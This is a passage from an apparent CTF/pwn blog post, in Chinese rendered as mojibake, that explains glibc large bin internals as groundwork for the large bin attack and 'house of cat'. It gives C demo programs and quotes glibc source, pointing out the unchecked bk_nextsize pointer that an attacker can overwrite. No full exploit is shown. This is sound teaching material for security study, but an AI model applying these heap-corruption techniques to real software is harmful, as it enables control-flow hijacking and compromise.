<!DOCTYPE html> <html lang="cn"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> large bin attackåŠhouse of cat | Leak Box 258 </title> <meta name="author" content="Leak Box 258"> <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. "> <meta name="keywords" content="PL, Rust, C++, Linux"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%99%BF%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://leakbox258.github.io/blog/2024/largebin-attack-%E4%BB%A5%E5%8F%8A-IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Leak</span> Box 258 </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/books/">bookshelf </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/books/">bookshelf</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">large bin attackåŠhouse of cat</h1> <p class="post-meta"> Created on December 12, 2024 by ä¹…èœåˆå­ </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a> Â  Â· Â  <a href="/blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a> Â  <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> CTF</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <p>â€ƒ<del>å¥½ä¸å®¹æ˜“å­¦ç‚¹ä¸œè¥¿èµ¶ç´§è®°ä¸‹æ¥, ä¸ç„¶è¿‡å‡ å¤©åˆå¿˜è®°äº†</del></p> <h3 id="å‰æƒ…æè¦">å‰æƒ…æè¦:<br> </h3> <h5 id="1-ç”±äºglibc-234å¼€å§‹-å»æ‰äº†å¸¸ç”¨çš„å„ç§hook-åŒ…æ‹¬__malloc_hook-__free_hook-__exit_hookç­‰-æ ‡å¿—äº†ä¸€ä¸ªæ—¶ä»£çš„è½å¹•-ä»æ­¤ä¹‹å-åœ¨æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„backdoorçš„æƒ…å†µä¸‹-ä»…ä»…ä½¿ç”¨tcachebin-unsortedbin-fastbinç­‰çš„æ”»å‡»å¾ˆéš¾è¾¾åˆ°åŠ«æŒæ‰§è¡Œæµçš„ç›®çš„-æ‰€ä»¥è¿™äº›æ–¹æ³•ç°åœ¨æ›´å¤šæ˜¯ä½œä¸ºä¸€ä¸ªæ³„éœ²åç§»çš„å­˜åœ¨">â€ƒâ€ƒâ€ƒ1. ç”±äºglibc 2.34å¼€å§‹, å»æ‰äº†å¸¸ç”¨çš„å„ç§hook, åŒ…æ‹¬__malloc_hook, __free_hook, __exit_hookç­‰, æ ‡å¿—äº†ä¸€ä¸ªæ—¶ä»£çš„è½å¹•. ä»æ­¤ä¹‹å, åœ¨æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„backdoorçš„æƒ…å†µä¸‹, ä»…ä»…ä½¿ç”¨tcachebin, unsortedbin, fastbinç­‰çš„æ”»å‡»å¾ˆéš¾è¾¾åˆ°åŠ«æŒæ‰§è¡Œæµçš„ç›®çš„, æ‰€ä»¥è¿™äº›æ–¹æ³•ç°åœ¨æ›´å¤šæ˜¯ä½œä¸ºä¸€ä¸ªæ³„éœ²åç§»çš„å­˜åœ¨<br> </h5> <h5 id="2-å¤±å»äº†hookä¸ä»£è¡¨å †é¢˜å°±æ²¡æ³•åŠ«æŒæ§åˆ¶æµäº†ä¸ç„¶è¿˜ç©ä¸ªè›‹-è¿˜å¯ä»¥å¯»æ‰¾å…¶ä»–åŠ«æŒçš„æ–¹æ³•-åŠ«æŒæ–¹æ³•éœ€è¦æ»¡è¶³-æ³›ç”¨æ€§-å³å¤§å¤šæ•°çš„æƒ…å†µä¸‹éƒ½å­˜åœ¨çš„åˆ©ç”¨æ–¹æ³•-ç®€æ˜“æ€§-åœ¨è¾ƒå°‘çš„æ¼æ´åˆ©ç”¨çš„æƒ…å†µä¸‹å°±å¯ä»¥å®ç°">â€ƒâ€ƒâ€ƒ2. å¤±å»äº†hookä¸ä»£è¡¨å †é¢˜å°±æ²¡æ³•åŠ«æŒæ§åˆ¶æµäº†(<del>ä¸ç„¶è¿˜ç©ä¸ªè›‹</del>), è¿˜å¯ä»¥å¯»æ‰¾å…¶ä»–åŠ«æŒçš„æ–¹æ³•. åŠ«æŒæ–¹æ³•éœ€è¦æ»¡è¶³: æ³›ç”¨æ€§, å³å¤§å¤šæ•°çš„æƒ…å†µä¸‹éƒ½å­˜åœ¨çš„åˆ©ç”¨æ–¹æ³•; ç®€æ˜“æ€§, åœ¨è¾ƒå°‘çš„æ¼æ´åˆ©ç”¨çš„æƒ…å†µä¸‹å°±å¯ä»¥å®ç°<br> </h5> <h5 id="3-åœ¨ç°æœ‰çš„è¯¸å¤šåŠ«æŒæ–¹æ³•ä¸­-å¯ä»¥æ€»ç»“å‡ºä¸€äº›ç»éªŒ-å°±æ˜¯-largebinattack--æŸç§house-å…¶ä¸­largebinattackæ‰‹æ³•ç”¨äºé¢„å¤‡ä¸€ä¸ªropæˆ–è€…åˆ«çš„ä»€ä¹ˆ-ä»¥åŠä¼ªé€ ä¸€ä¸ªio_file_plusç»“æ„ä½“-ç„¶åç”±æŸç§æ‰‹æ³•å°†æ§åˆ¶æµäº¤ç»™rop">â€ƒâ€ƒâ€ƒ3. åœ¨ç°æœ‰çš„è¯¸å¤šåŠ«æŒæ–¹æ³•ä¸­, å¯ä»¥æ€»ç»“å‡ºä¸€äº›ç»éªŒ, å°±æ˜¯ largebinAttack + æŸç§house. å…¶ä¸­largebinAttackæ‰‹æ³•ç”¨äºé¢„å¤‡ä¸€ä¸ªROP(æˆ–è€…åˆ«çš„ä»€ä¹ˆ), ä»¥åŠä¼ªé€ ä¸€ä¸ªIO_FILE_PLUSç»“æ„ä½“, ç„¶åç”±æŸç§æ‰‹æ³•å°†æ§åˆ¶æµäº¤ç»™ROP</h5> <h3 id="å¹´è½»äººçš„ç¬¬ä¸€ä¸ªlargebin-attack">å¹´è½»äººçš„ç¬¬ä¸€ä¸ªlargebin attack</h3> <h5 id="å¯¹äºä¸€ä¸ªchunk-å½“è¢«freeçš„æ—¶å€™-å¦‚æœå¤§å°å°äºtcachebinçš„ä¸Šé™çš„è¯-è¢«æ”¾è¿›å¯¹åº”çš„tcachebinå†…-å¦‚æœå¤§äºçš„è¯-ä¼šè¢«æ”¾åˆ°unsorted-binå†…-æ˜¾ç„¶-æˆ‘ä»¬ç°åœ¨è®¨è®ºåè€…">â€ƒâ€ƒâ€ƒå¯¹äºä¸€ä¸ªchunk, å½“è¢«freeçš„æ—¶å€™, å¦‚æœå¤§å°å°äºtcachebinçš„ä¸Šé™çš„è¯, è¢«æ”¾è¿›å¯¹åº”çš„tcachebinå†…, å¦‚æœå¤§äºçš„è¯, ä¼šè¢«æ”¾åˆ°unsorted binå†…. æ˜¾ç„¶, æˆ‘ä»¬ç°åœ¨è®¨è®ºåè€….<br> </h5> <h5 id="-æ”¾è¿›unsorted-binçš„å¤§chunk-ä¼šåœ¨ä¸‹ä¸€æ¬¡mallocæ—¶è¢«å†³å®šè‡ªå·±çš„å‘½è¿-å½“mallocæ— æ³•åœ¨tcacheå’Œfastbinå†…æ‰¾åˆ°åˆé€‚çš„chunkå½“å‰binsä¸­çš„chunkéƒ½å¤ªå°-å®ƒä¼šéå†unsorted-bin">â€ƒâ€ƒâ€ƒ æ”¾è¿›unsorted binçš„å¤§chunk, ä¼šåœ¨ä¸‹ä¸€æ¬¡mallocæ—¶è¢«å†³å®šè‡ªå·±çš„å‘½è¿. å½“mallocæ— æ³•åœ¨tcacheå’Œfastbinå†…æ‰¾åˆ°åˆé€‚çš„chunk(å½“å‰binsä¸­çš„chunkéƒ½å¤ªå°), å®ƒä¼šéå†unsorted bin<br> </h5> <h5 id="-å‡å¦‚mallocä¾ç„¶æ— æ³•æ‰¾åˆ°-åŒæ—¶ç›®æ ‡çš„large-binæ²¡æœ‰å’Œé™„è¿‘çš„free-chunkæˆ–è€…æ˜¯top-chunkåˆå¹¶-é‚£ä¹ˆå®ƒå°±ä¼šè¢«åŸå°ä¸åŠ¨çš„æ”¾åˆ°ä¸€ä¸ªlarge-binå†…">â€ƒâ€ƒâ€ƒ å‡å¦‚mallocä¾ç„¶æ— æ³•æ‰¾åˆ°, åŒæ—¶ç›®æ ‡çš„large binæ²¡æœ‰å’Œé™„è¿‘çš„free chunkæˆ–è€…æ˜¯top chunkåˆå¹¶, é‚£ä¹ˆå®ƒå°±ä¼šè¢«åŸå°ä¸åŠ¨çš„æ”¾åˆ°ä¸€ä¸ªlarge binå†…<br> </h5> <h5 id="largebinå…·æœ‰å’Œå…¶ä»–çš„binsä¸åŒçš„æ„é€ -å¯¹äºæ¯”è¾ƒå°çš„chunk-æ¯ä¸ªchunk-sizeéƒ½ç›¸å¯¹å¸¸ç”¨-æ‰€ä»¥éƒ½æœ‰å¯¹åº”çš„bin-ä½†æ˜¯large-chunkæœ¬èº«å°±ä¸å¸¸ç”¨-å…·ä½“è½åˆ°æ¯ä¸ªchunk-sizeæ›´å°‘-æ‰€ä»¥glibcåšæ³•æ˜¯ä¸€å®šchunk-sizeå†…åˆ’åˆ†ä¸€ä¸ªbin-å¦‚å›¾">â€ƒâ€ƒâ€ƒlargebinå…·æœ‰å’Œå…¶ä»–çš„binsä¸åŒçš„æ„é€ , å¯¹äºæ¯”è¾ƒå°çš„chunk, æ¯ä¸ªchunk sizeéƒ½ç›¸å¯¹å¸¸ç”¨, æ‰€ä»¥éƒ½æœ‰å¯¹åº”çš„bin. ä½†æ˜¯large chunkæœ¬èº«å°±ä¸å¸¸ç”¨, å…·ä½“è½åˆ°æ¯ä¸ªchunk sizeæ›´å°‘, æ‰€ä»¥glibcåšæ³•æ˜¯ä¸€å®šchunk sizeå†…åˆ’åˆ†ä¸€ä¸ªbin, å¦‚å›¾</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x390</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675a8d7e437fb.png" alt="Screenshot 2024-12-12 151434.png"></p> <h5 id="ä¸Šé¢ä¸€è¡Œ0x4000x430è™½ç„¶æ˜¯è¿™ä¹ˆå†™-ä½†å®é™…ä¸Šåªæœ‰chunksize--0x420-ä¹Ÿå³malloc0x410ä»¥ä¸Šæ‰ä¼šæ”¾åˆ°largebin">â€ƒâ€ƒâ€ƒä¸Šé¢ä¸€è¡Œ<code class="language-plaintext highlighter-rouge">0x400~0x430</code>è™½ç„¶æ˜¯è¿™ä¹ˆå†™, ä½†å®é™…ä¸Šåªæœ‰chunksize &gt; 0x420, ä¹Ÿå³<code class="language-plaintext highlighter-rouge">malloc(0x410)</code>ä»¥ä¸Šæ‰ä¼šæ”¾åˆ°largebin<br> </h5> <h5 id="ä¸€ä¸ªlargebinå†…chunksizeæ˜¯éå‡åºæ’åˆ—çš„-ä¹Ÿå°±æ˜¯ä»å¤§åˆ°å°çš„è¶‹åŠ¿-å›¾ä¸­ä»å·¦å‘å³-main_arenaä½œä¸ºé“¾è¡¨çš„å°¾--å¤§å°ç›¸åŒçš„ç´§æŒ¨ç€">â€ƒâ€ƒâ€ƒä¸€ä¸ªlargebinå†…chunksizeæ˜¯éå‡åºæ’åˆ—çš„, ä¹Ÿå°±æ˜¯ä»å¤§åˆ°å°çš„è¶‹åŠ¿ (å›¾ä¸­ä»å·¦å‘å³, main_arenaä½œä¸ºé“¾è¡¨çš„å°¾) , å¤§å°ç›¸åŒçš„ç´§æŒ¨ç€<br> </h5> <h5 id="largebin-chunkå†…éƒ¨çš„å­˜æ”¾æœ‰ç®¡ç†è¿™ä¸ªé“¾è¡¨çš„ä¿¡æ¯-fd-bk-fd_nextsize-bk_nextsize-fd-bkå’Œå…¶ä»–binæ²¡æœ‰åŒºåˆ«-è¿æ¥ç€è¯¥binä¸­çš„æ‰€æœ‰chunk-ä»¥åŠè¯¥binæ‰€å¯¹åº”çš„main_arena">â€ƒâ€ƒâ€ƒlargebin chunkå†…éƒ¨çš„å­˜æ”¾æœ‰ç®¡ç†è¿™ä¸ªé“¾è¡¨çš„ä¿¡æ¯, <code class="language-plaintext highlighter-rouge">fd, bk, fd_nextsize, bk_nextsize</code>, <code class="language-plaintext highlighter-rouge">fd, bk</code>å’Œå…¶ä»–binæ²¡æœ‰åŒºåˆ«, è¿æ¥ç€è¯¥binä¸­çš„æ‰€æœ‰chunk, ä»¥åŠè¯¥binæ‰€å¯¹åº”çš„<code class="language-plaintext highlighter-rouge">main_arena</code><br> </h5> <h5 id="å†çœ‹ä¸€ä¸ªç -å¤§æ¦‚æ„æ€å°±æ˜¯ä¸€ä¸ªchunksizeæœ‰ä¸¤ä¸ª-ä¸€ä¸ªbinå†…ä¸€å…±6ä¸ª">â€ƒâ€ƒâ€ƒå†çœ‹ä¸€ä¸ªç , å¤§æ¦‚æ„æ€å°±æ˜¯ä¸€ä¸ªchunksizeæœ‰ä¸¤ä¸ª, ä¸€ä¸ªbinå†…ä¸€å…±6ä¸ª</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae050022e3.png" alt="Screenshot 2024-12-12 210547.png"></p> <h5 id="ç»™å¤§ä»¬ç”»ä¸€ä¸ª-ä½†æ˜¯æ‰‹å¤ªåƒµäº†">â€ƒâ€ƒâ€ƒç»™å¤§ğŸ”¥ä»¬ç”»ä¸€ä¸ª, ä½†æ˜¯æ‰‹å¤ªåƒµäº†</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675ae05088772.jpg" alt="æ‰«æå…¨èƒ½ç‹ 2024-12-12 21.02.jpg"></p> <h5 id="ç”±fd-bk-è¿æ¥èµ·äº†å…¨éƒ¨chunkå’Œmain_arena-è¿™ä¹Ÿæ˜¯gdbä¸Šå±•ç¤ºçš„é¡ºåº">â€ƒâ€ƒâ€ƒç”±<code class="language-plaintext highlighter-rouge">fd, bk</code>, è¿æ¥èµ·äº†å…¨éƒ¨chunkå’Œ<code class="language-plaintext highlighter-rouge">main_arena</code>, è¿™ä¹Ÿæ˜¯gdbä¸Šå±•ç¤ºçš„é¡ºåº<br> </h5> <h5 id="å…¶æ¬¡fd_nextsize-bk_nextsize-åªæœ‰æ¯ä¸€ç»„å¤§å°ç›¸åŒçš„chunksä¸­çš„ç¬¬ä¸€ä¸ªæ‰æœ‰è¿™ä¸¤ä¸ªå†…å®¹-å¹¶ä¸”ä¸è¿æ¥main_arena">â€ƒâ€ƒâ€ƒå…¶æ¬¡<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>, åªæœ‰æ¯ä¸€ç»„å¤§å°ç›¸åŒçš„chunksä¸­çš„ç¬¬ä¸€ä¸ªæ‰æœ‰è¿™ä¸¤ä¸ªå†…å®¹, å¹¶ä¸”ä¸è¿æ¥<code class="language-plaintext highlighter-rouge">main_arena</code><br> </h5> <h5 id="ç‰¹åˆ«åœ°-å½“ä¸€ä¸ªbinä¸­åªæœ‰ä¸¤ç»„ä¸åŒå¤§å°çš„chunksæ—¶-ä¸€ä¸ªç»„çš„fd_nextsize-bk_nextsizeéƒ½æŒ‡å‘å¦ä¸€ç»„å› ä¸ºåŒå‘é“¾è¡¨-åªæœ‰ä¸€ç»„æ—¶-è¿™å¯¹æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±">â€ƒâ€ƒâ€ƒç‰¹åˆ«åœ°, å½“ä¸€ä¸ªbinä¸­åªæœ‰ä¸¤ç»„ä¸åŒå¤§å°çš„chunksæ—¶, ä¸€ä¸ªç»„çš„<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>éƒ½æŒ‡å‘å¦ä¸€ç»„(å› ä¸ºåŒå‘é“¾è¡¨); åªæœ‰ä¸€ç»„æ—¶, è¿™å¯¹æŒ‡é’ˆéƒ½ä¼šæŒ‡å‘è‡ªå·±</h5> <h5 id="fd_nextsize-bk_nextsizeæ˜¯ä¸“é—¨ç”¨äºç®¡ç†åŒä¸€ä¸ªlarge-binä¸­ä¸åŒå¤§å°çš„chunkçš„æ’åˆ—çš„-è¿™ä¸€ç»„æŒ‡é’ˆå’Œä¸Šä¸€ç»„ä¸åŒ-å¹¶ä¸ä¼šè¿æ¥main_arena">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>æ˜¯ä¸“é—¨ç”¨äºç®¡ç†åŒä¸€ä¸ªlarge binä¸­ä¸åŒå¤§å°çš„chunkçš„æ’åˆ—çš„, è¿™ä¸€ç»„æŒ‡é’ˆå’Œä¸Šä¸€ç»„ä¸åŒ, å¹¶ä¸ä¼šè¿æ¥<code class="language-plaintext highlighter-rouge">main_arena</code><br> </h5> <h5 id="large-bin-attackä¸»è¦æ”»å‡»çš„æ˜¯fd_nextsize-bk_nextsizeè¿™ä¸€ç»„æŒ‡é’ˆ">â€ƒâ€ƒâ€ƒlarge bin attackä¸»è¦æ”»å‡»çš„æ˜¯<code class="language-plaintext highlighter-rouge">fd_nextsize, bk_nextsize</code>è¿™ä¸€ç»„æŒ‡é’ˆ</h5> <h5 id="-çœ‹ä¸€æ®µglibcæºç ">â€ƒâ€ƒâ€ƒ çœ‹ä¸€æ®µglibcæºç </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">size</span> <span class="o">==</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">fwd</span><span class="p">)){</span>
    <span class="cm">/* Always insert in the second position.  */</span>
    <span class="c1">/// å½“å­˜åœ¨ä¸€ä¸ªchunkçš„sizeä¸victimä¸€è‡´</span>
    <span class="n">fwd</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
<span class="k">else</span><span class="p">{</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">))</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted (nextsize)"</span><span class="p">);</span>
        <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
        <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
<span class="p">}</span>
    <span class="n">bck</span> <span class="o">=</span> <span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">fwd</span><span class="p">)</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): largebin double linked list corrupted(bk)"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div> <h5 id="æœ‰é—®é¢˜çš„è¯­å¥åœ¨victim-bk_nextsize--fwd-bk_nextsizeå’Œvictim-bk_nextsize-fd_nextsize--victim-å³å½“æ‰¾ä¸åˆ°ä¸€ä¸ªç›¸åŒsizeçš„chunk-ç›®æ ‡victimå¿…é¡»ç”Ÿæˆä¸€å¯¹nextsize-æ¥ç®¡ç†å®ƒè‡ªå·±sizeå¤§å°çš„large-chunks-é—®é¢˜åœ¨äºç¼ºå°‘å¯¹äºfwd-bk_nextsizeçš„æ£€æŸ¥-å®ƒå®é™…ä¸Šæœ‰å¯èƒ½è¢«ç¯¡æ”¹ä¸ºå…¶ä»–åœ°å€">â€ƒâ€ƒâ€ƒæœ‰é—®é¢˜çš„è¯­å¥åœ¨<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>å’Œ<code class="language-plaintext highlighter-rouge">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>, å³å½“æ‰¾ä¸åˆ°ä¸€ä¸ªç›¸åŒsizeçš„chunk, ç›®æ ‡victimå¿…é¡»ç”Ÿæˆä¸€å¯¹<code class="language-plaintext highlighter-rouge">nextsize</code>, æ¥ç®¡ç†å®ƒè‡ªå·±sizeå¤§å°çš„large chunks, é—®é¢˜åœ¨äºç¼ºå°‘å¯¹äº<code class="language-plaintext highlighter-rouge">fwd-&gt;bk_nextsize</code>çš„æ£€æŸ¥, å®ƒå®é™…ä¸Šæœ‰å¯èƒ½è¢«ç¯¡æ”¹ä¸ºå…¶ä»–åœ°å€<br> </h5> <h5 